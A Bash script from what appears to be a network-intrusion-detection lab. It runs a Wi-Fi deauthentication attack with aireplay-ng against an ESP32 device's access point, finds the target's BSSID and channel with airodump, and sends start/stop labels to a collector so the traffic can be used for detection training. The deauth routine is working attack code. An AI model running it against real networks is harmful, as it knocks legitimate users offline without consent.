#!/usr/bin/env bash
# Deauth attack + labeling (Kali / monitor mode).
# Usage: sudo -E ./host/attacks/attack_deauth.sh
#
# Auto (default):
#   - ensure_label_path: ping Pi/label host; restore Mode P route if needed
#   - short airodump for SSID → fresh BSSID+channel (phone hotspots rotate)
#   - on aireplay "No such BSSID", rescan once and retry
#   - EXIT trap sends STOP if START was sent (set -e / early fail)
#
# Override: export NIDS_BSSID / NIDS_WIFI_CHANNEL to force; NIDS_SKIP_AP_SCAN=1
#   skips airodump (not recommended for phone APs).
#
# After this attack, run: sudo -E ./host/attacks/prepare_wifi.sh managed
# before SYN / ARP.
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

LABEL_SENT=0
_cleanup_label() {
  if [[ "${LABEL_SENT}" -eq 1 ]]; then
    echo ">>> cleanup: sending STOP DEAUTH (attack ended early or script exiting)" >&2
    send_label STOP DEAUTH || true
    LABEL_SENT=0
  fi
}
trap _cleanup_label EXIT

if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  echo ">>> ${MON_IFACE} not found — running prepare_wifi.sh monitor"
  bash "${DIR}/prepare_wifi.sh" monitor
fi

# Label path first — do not START if Kali cannot reach collector host
ensure_label_path || exit 1

TARGET_MAC="$(get_esp32_mac)"

apply_channel() {
  local ch="$1"
  [[ -n "$ch" && "$ch" != "null" && "$ch" != "0" ]] || return 0
  echo ">>> Setting ${MON_IFACE} to channel ${ch}"
  iw dev "$MON_IFACE" set channel "$ch" 2>/dev/null \
    || iwconfig "$MON_IFACE" channel "$ch" 2>/dev/null \
    || echo ">>> WARN: could not set channel ${ch}" >&2
}

# Resolve BSSID/channel: forced env > fresh airodump > live_state / iw
BSSID=""
CHANNEL=""
if [[ -n "${NIDS_BSSID:-}" ]]; then
  BSSID="$NIDS_BSSID"
  CHANNEL="${NIDS_WIFI_CHANNEL:-$(_json_field channel 2>/dev/null || true)}"
  echo ">>> Using forced NIDS_BSSID=${BSSID}"
elif [[ "${NIDS_SKIP_AP_SCAN:-0}" != "1" ]]; then
  if hit="$(airodump_find_ap "$MON_IFACE" "$SSID")"; then
    BSSID="${hit%% *}"
    CHANNEL="${hit##* }"
    export NIDS_BSSID="$BSSID"
    export NIDS_WIFI_CHANNEL="$CHANNEL"
    echo ">>> Auto-exported NIDS_BSSID=${BSSID} NIDS_WIFI_CHANNEL=${CHANNEL}"
  else
    echo ">>> WARN: airodump miss — falling back to live_state / iw scan" >&2
  fi
fi

if [[ -z "$BSSID" ]]; then
  BSSID="$(resolve_bssid)" || {
    echo ">>> Could not resolve BSSID. Run airodump or export NIDS_BSSID=.." >&2
    exit 1
  }
fi

if [[ -z "${CHANNEL}" || "${CHANNEL}" == "null" || "${CHANNEL}" == "0" ]]; then
  if [[ -n "${NIDS_WIFI_CHANNEL:-}" ]]; then
    CHANNEL="$NIDS_WIFI_CHANNEL"
  else
    CHANNEL="$(_json_field channel 2>/dev/null || true)"
  fi
fi

apply_channel "$CHANNEL"

echo ">>> Target ESP32 MAC : $TARGET_MAC"
echo ">>> AP BSSID         : $BSSID"
echo ">>> Channel          : ${CHANNEL:-?(unknown)}"
echo ">>> Monitor iface    : $MON_IFACE"
echo ">>> Label host       : $(get_label_host):${LABEL_PORT}"
echo ">>> READY FOR DEAUTH"

send_label START DEAUTH
LABEL_SENT=1
sleep 0.5

run_aireplay_batch() {
  # Capture aireplay; return 99 if "No such BSSID", else aireplay rc.
  # Default: quiet (one summary line). NIDS_VERBOSE=1 prints full aireplay spam.
  local out rc=0
  set +e
  out="$(aireplay-ng -0 "$batch" -a "$BSSID" -c "$TARGET_MAC" "$MON_IFACE" 2>&1)"
  rc=$?
  set -e
  if [[ "${NIDS_VERBOSE:-0}" == "1" ]]; then
    printf '%s\n' "$out"
  else
    if printf '%s\n' "$out" | grep -qi 'No such BSSID'; then
      echo ">>> aireplay: No such BSSID"
    elif printf '%s\n' "$out" | grep -qi 'Sending'; then
      echo ">>> aireplay: sent deauth OK (rc=${rc})"
    else
      # keep last non-empty line for clues without flooding the terminal
      echo ">>> aireplay: rc=${rc} ($(printf '%s\n' "$out" | grep -v '^$' | tail -n1))"
    fi
  fi
  if printf '%s\n' "$out" | grep -qi 'No such BSSID'; then
    return 99
  fi
  return "$rc"
}

batch=10
repeats=5
rescanned=0
for ((i=1; i<=repeats; i++)); do
  echo ">>> Batch ${i}/${repeats}: ${batch} deauth frames"
  if [[ -n "${CHANNEL:-}" && "${CHANNEL}" != "null" ]]; then
    iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null || true
  fi

  set +e
  run_aireplay_batch
  batch_rc=$?
  set -e

  if [[ "$batch_rc" -eq 99 && "$rescanned" -eq 0 && "${NIDS_SKIP_AP_SCAN:-0}" != "1" ]]; then
    echo ">>> aireplay: No such BSSID — auto airodump refresh + retry batch" >&2
    if hit="$(airodump_find_ap "$MON_IFACE" "$SSID")"; then
      BSSID="${hit%% *}"
      CHANNEL="${hit##* }"
      export NIDS_BSSID="$BSSID"
      export NIDS_WIFI_CHANNEL="$CHANNEL"
      echo ">>> Refreshed NIDS_BSSID=${BSSID} NIDS_WIFI_CHANNEL=${CHANNEL}"
      apply_channel "$CHANNEL"
      rescanned=1
      set +e
      run_aireplay_batch
      batch_rc=$?
      set -e
    fi
  fi

  if [[ "$batch_rc" -eq 99 ]]; then
    echo ">>> ERROR: still No such BSSID after rescan. Check SSID='${SSID}' / USB Wi-Fi." >&2
    exit 1
  fi
  if [[ "$batch_rc" -ne 0 ]]; then
    echo ">>> WARN: aireplay exit ${batch_rc} (continuing next batch)" >&2
  fi
  sleep 0.5
done

sleep 1
send_label STOP DEAUTH
LABEL_SENT=0
echo " >>> ATTACK FINISHED"
echo " >>> Next for SYN/ARP: sudo -E ./host/attacks/prepare_wifi.sh managed"
